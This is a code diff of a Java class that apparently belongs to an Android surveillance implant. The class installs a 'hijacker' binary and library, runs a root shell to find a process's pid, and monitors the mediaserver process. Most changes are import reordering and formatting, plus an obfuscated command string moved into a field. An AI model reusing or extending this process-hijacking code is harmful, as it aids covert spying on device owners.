@@ -1,15 +1,5 @@
 package com.android.dvci.util;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
-
-
-
-
 import com.android.dvci.Beep;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
@@ -17,8 +7,13 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
-
 import com.android.mm.M;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
 
 public class Instrument {
 	private static final String TAG = "Instrument";
@@ -30,6 +25,7 @@ public class Instrument {
 
 	private Thread monitor;
 	private int killed = 0;
+	private String lid = M.e(" lid ");
 
 	public Instrument(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -70,7 +66,7 @@ public class Instrument {
 
 			// Install library
 			Execute.chmod(M.e("666"), path + "/" + lib);
-			Execute.chmod(M.e("750"),  path + "/" + hijacker);
+			Execute.chmod(M.e("750"), path + "/" + hijacker);
 
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
@@ -134,8 +130,8 @@ public class Instrument {
 							}
 							started = true;
 							file.delete();
-							
-							if(Cfg.DEMO){
+
+							if (Cfg.DEMO) {
 								Beep.beep();
 							}
 						}
@@ -207,7 +203,7 @@ public class Instrument {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getProcessPid) " + proc + " " + pidCompletePath);
 		}
-		Execute.execute(Configuration.shellFile + " " + M.e("lid") + " " + proc + " " + pidCompletePath);
+		Execute.execute(Configuration.shellFile + lid + proc + " " + pidCompletePath);
 
 		try {
 			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);
@@ -267,7 +263,7 @@ public class Instrument {
 		@Override
 		public void run() {
 			while (true) {
-				
+
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
@@ -296,7 +292,7 @@ public class Instrument {
 				} else {
 					failedCounter = 0;
 				}
-				
+
 				Utils.sleep(10000);
 			}
 		}
